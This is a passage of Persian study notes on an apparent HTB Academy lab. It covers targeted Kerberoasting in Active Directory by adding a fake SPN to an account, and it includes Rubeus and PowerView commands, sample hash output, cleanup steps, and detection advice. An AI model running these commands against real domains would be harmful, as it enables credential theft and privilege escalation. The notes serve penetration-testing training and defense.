- یعنی آن تغییر با اعتبارنامه‌ای انجام می‌شود که در `$Cred2` ذخیره شده — یعنی شما به‌جای کاربری دیگر (یا با آن حساب) عملیات را اجرا می‌کنید.
    
- `-Verbose` 
- فقط خروجی جزئیات بیشتری می‌دهد تا متوجه شوی عملیات موفق بوده یا خطا خورده.
    

در واقع این دستور **یک/چند SPN را به حساب کاربری اضافه یا جایگزین** می‌کند. SPN (Service Principal Name) رشته‌ای است که یک سرویس شبکه را برای Kerberos شناسایی می‌کند، مثلاً `CIFS/server.domain.local` یا `HTTP/websvc.domain.local`.

---

## چرا مهاجمین SPN جعلی می‌سازند (مفهومی)

- وقتی روی یک حساب SPN داشته باشی، کلاینت‌ها/سرورها می‌توانند **تیکت سرویس (TGS)** را برای آن SPN از KDC درخواست کنند.
    
- اگر مهاجم بتواند یک SPN را به حسابی که کنترل/دسترسی نسبی به آن دارد اضافه کند، سپس می‌تواند یک TGS برای آن SPN بگیرد و هش‌شدهٔ بخش مربوط به سرویس (TGS) را استخراج کند — سپس آن هش را **آفلاین** (مثلاً در Hashcat) کرک کند تا رمز حساب را به‌دست آورد. این روش «Kerberoasting» نامیده می‌شود.
    
- ساختن یک **SPN جعلی** (مثلاً نامی که سرویس واقعی را شبیه‌سازی کند) برای این است که مهاجم بتواند تیکت قابل کرک تولید کند برایِ حسابِ هدف.
    

> نکته: برای اینکه Kerberoast موفق باشد، حساب هدف معمولاً باید SPN داشته باشد _و_ از یک الگوریتم قابل کرک (مثلاً RC4) استفاده کند یا رمز ضعیف داشته باشد.

---

## چه مجوزهایی لازم است تا کسی بتواند SPN را تغییر دهد

- باید اجازهٔ نوشتن روی attribute `servicePrincipalName` را روی شیء مورد نظر داشته باشی. این اجازه معمولاً از طریق ACEهایی مانند **GenericWrite**, **WriteProperty** یا **GenericAll** (کنترل کامل) فراهم می‌شود.
    
- بنابراین اگر روی یک حساب `GenericAll` یا دسترسی مشخصی داشته باشی، می‌توانی SPN آن را تغییر دهی — همین مجوزها هستند که در حملاتِ مبتنی بر ACL سوء‌استفاده می‌شوند.




### درخواست تیکت سرویس (Kerberoast) با Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

(خروجی ابزار نمایشی و لوگوی Rubeus نمایش داده می‌شود)

خُب! با موفقیت هش را گرفتیم. آخرین گام، تلاش برای کرک آفلاینِ هش با **Hashcat** است. وقتی رمز متن ساده را به‌دست آوردیم، می‌توانیم به‌عنوان `adunn` احراز هویت کنیم و حملهٔ **DCSync** را اجرا کنیم (در بخش بعدی پوشش داده خواهد شد).

---

## خروجی نمونهٔ Rubeus (خلاصهٔ مهم)

```
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target User : adunn
[*] Target Domain : INLANEFREIGHT.LOCAL
[*] ... searching LDAP ...
[*] Total kerberoastable users : 1
[*] SamAccountName : adunn
[*] DistinguishedName : CN=Angela Dunn,...
[*] ServicePrincipalName : notahacker/LEGIT
[*] Supported ETypes : RC4_HMAC_DEFAULT
[*] Hash : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/...$
```

---

## پاکسازی (Cleanup) — چه کارهایی باید انجام شود

این ترتیب مهم است، چون اگر ابتدا کاربر را از گروه حذف کنیم، ممکن است دیگر حق لازم برای حذف SPN جعلی را نداشته باشیم.

مراحل پیشنهادی پاکسازی:

1. حذف **SPN جعلی** که روی حساب `adunn` ساخته‌ایم.
    
2. حذف کاربر `damundsen` از گروه **Help Desk Level 1**.
    
3. بازنشاندن رمز `damundsen` به مقدار قبلی (اگر آن را می‌دانیم) یا درخواست از مشتری که رمز را برای کاربر تنظیم/اطلاع‌رسانی کند.
    

---


## حذف SPN جعلی از حساب `adunn` و پاک‌سازی عضویت گروه

بعد از اینکه کارمان تمام شد، باید SPN جعلی را از حساب `adunn` پاک کنیم و سپس کاربر `damundsen` را از گروه خارج کنیم. ترتیب این کار مهم است — اگر اول کاربر را از گروه حذف کنیم، ممکن است دیگر امتیازات لازم برای حذف SPN را نداشته باشیم.

### حذف SPN جعلی

```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

خروجی‌های verbose نشان می‌دهند که:

- از اعتبارنامهٔ جایگزین استفاده شده،
    
- جستجوی LDAP به محل دامنه انجام شده،
    
- و در نهایت attribute `serviceprincipalname` برای شیء `adunn` پاک (Clear) شده است.
    

### حذف `damundsen` از گروه Help Desk Level 1

```
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

خروجی نشان می‌دهد که کاربر با موفقیت از گروه حذف شده (`True`) و می‌توان با یک دستور `Get-DomainGroupMember` تأیید کرد که `damundsen` دیگر عضو گروه نیست.

---

## Detection and Remediation (تشخیص و مقابله)

🔹 **توصیه‌ها برای مقابله با حملات ACL:**

1. **انجام منظم ممیزی Active Directory**  
    سازمان‌ها باید مرتباً AD Audit انجام دهند و همچنین کارکنان داخلی را آموزش دهند که با ابزارهایی مثل **BloodHound** کار کنند و ACLهای خطرناک را شناسایی و حذف کنند.
    
2. **نظارت بر گروه‌های مهم**  
    گروه‌های حساس و پرریسک در دامنه (High-impact Groups) باید همیشه مانیتور شوند. هر تغییری در این گروه‌ها می‌تواند نشانه‌ای از زنجیره حمله ACL باشد.
    
3. **فعال‌سازی Advanced Security Audit Policy**  
    این قابلیت می‌تواند به شناسایی تغییرات ناخواسته کمک کند.
    
    - مخصوصاً **Event ID 5136**: وقتی یک **Domain Object** تغییر کند، این رویداد ثبت می‌شود و می‌تواند نشانه‌ی حمله‌ی ACL باشد.

---

وقتی مجوزها (Permissions) یا ACLها رو نگاه می‌کنیم، سیستم اون‌ها رو به شکل **SDDL** ذخیره می‌کنه. این فرمت برای کامپیوتر خوانا است، اما برای انسان‌ها سخت و ناخواناست. برای همین ما معمولاً از ابزارهایی مثل **PowerView** یا **BloodHound** استفاده می‌کنیم تا این اطلاعات رو به شکل قابل فهم ببینیم.

![[Pasted image 20250924061854.png]]



